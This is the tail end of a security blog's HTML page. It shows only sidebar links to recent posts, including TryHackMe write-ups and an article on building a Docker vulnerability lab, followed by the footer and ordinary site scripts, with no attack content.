class="content"><a class="title" href="/2023/06/24/THM-WriteUp-Flatline/" title="THM-WriteUp_Flatline">THM-WriteUp_Flatline</a><time datetime="2023-06-24T16:16:00.000Z" title="Created 2023-06-24 12:16:00">2023-06-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/20/%E5%A6%82%E4%BD%95%E8%87%AA%E5%B7%B1%E7%94%A8Docker%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E6%B8%AC%E8%A9%A6%E7%92%B0%E5%A2%83/" title="如何自己用Docker快速搭建漏洞測試環境"><img src="https://images2.imgbox.com/30/65/2YnBhDA0_o.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="如何自己用Docker快速搭建漏洞測試環境"/></a><div class="content"><a class="title" href="/2023/06/20/%E5%A6%82%E4%BD%95%E8%87%AA%E5%B7%B1%E7%94%A8Docker%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E6%B8%AC%E8%A9%A6%E7%92%B0%E5%A2%83/" title="如何自己用Docker快速搭建漏洞測試環境">如何自己用Docker快速搭建漏洞測試環境</a><time datetime="2023-06-20T17:13:35.000Z" title="Created 2023-06-20 13:13:35">2023-06-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/06/17/THM-WriteUp-Revenge/" title="THM-WriteUp_Revenge">THM-WriteUp_Revenge</a><time datetime="2023-06-17T13:00:15.000Z" title="Created 2023-06-17 09:00:15">2023-06-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 0x0tu</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
